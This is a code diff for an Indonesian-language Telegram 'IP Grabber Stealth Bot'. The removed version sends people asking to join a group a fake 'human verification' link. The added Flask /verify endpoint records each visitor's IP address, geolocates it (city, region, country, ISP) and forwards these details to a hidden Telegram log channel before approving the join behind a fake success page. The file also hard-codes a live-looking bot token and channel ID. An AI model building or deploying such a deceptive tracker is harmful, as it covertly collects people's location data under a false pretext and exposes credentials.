@@ -1,47 +1,64 @@
-import telebot
-from telebot import types
+from flask import Flask, request
+import requests
 import os
+from datetime import datetime
 
-# Get credentials from Railway environment variables
-BOT_TOKEN = os.getenv('8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI')
-WEB_URL = os.getenv('https://ip-grabber-bot-production.up.railway.app')
-LOG_CHANNEL = os.getenv('-1003976117318')
+# === DATA KAMU (sudah diisi) ===
+BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
+LOG_CHANNEL = "-1003976117318"
 
-# DEBUG prints to see what is actually loaded
-print("=== DEBUG START ===")
-print(f"BOT_TOKEN loaded: {8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI}")
-print(f"WEB_URL loaded: {https://ip-grabber-bot-production.up.railway.app}")
-print(f"LOG_CHANNEL loaded: {-1003976117318}")
-print("=== DEBUG END ===")
+app = Flask(__name__)
 
-bot = telebot.TeleBot(BOT_TOKEN)
+@app.route('/verify')
+def verify():
+    chat_id = request.args.get('chat_id')
+    user_id = request.args.get('user_id')
+    name = request.args.get('name', 'User')
 
-@bot.chat_join_request_handler()
-def handle_join_request(request: types.ChatJoinRequest):
-    user_id = request.user_chat_id
-    chat_id = request.chat.id
-    first_name = request.from_user.first_name or "User"
+    if not chat_id or not user_id:
+        return "Link tidak valid.", 400
 
-    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"
-
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔐 Verify Account & Join Group", url=link))
-
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    
+    geo = {}
     try:
-        bot.send_message(
-            user_id,
-            f"✅ Human verification successful!\n\n"
-            f"Click the button below for **final verification** and to join the group:\n\n"
-            f"Link will expire in 10 minutes.",
-            reply_markup=markup
-        )
-        print(f"✅ Verification link sent to user {user_id}")
-    except Exception as e:
-        print(f"❌ Failed to send PM to {user_id}: {e}")
+        geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,lat,lon", timeout=5)
+        if geo_resp.status_code == 200:
+            geo = geo_resp.json()
+    except:
+        pass
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "✅ IP Grabber Stealth Bot is active!")
+    location = f"{geo.get('city', 'Unknown')}, {geo.get('regionName', '')} - {geo.get('country', 'Unknown')}"
 
-print("🤖 IP Grabber Stealth Bot is running...")
-bot.infinity_polling()
+    log_text = f"""
+🔥 **NEW MEMBER DETECTED**
+
+👤 Nama: {name}
+🆔 User ID: <code>{user_id}</code>
+🌐 IP: <code>{ip}</code>
+📍 Lokasi: {location}
+🏢 ISP: {geo.get('isp', 'Unknown')}
+⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+    """
+
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"}
+    )
+
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
+        json={"chat_id": chat_id, "user_id": user_id}
+    )
+
+    return """
+    <h2 style="text-align:center; font-family:sans-serif; margin-top:100px; color:green;">
+        ✅ Verifikasi Berhasil!<br><br>
+        Kamu sudah diverifikasi dan sedang di-approve ke grup.<br>
+        Mohon tunggu sebentar...
+    </h2>
+    """, 200
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
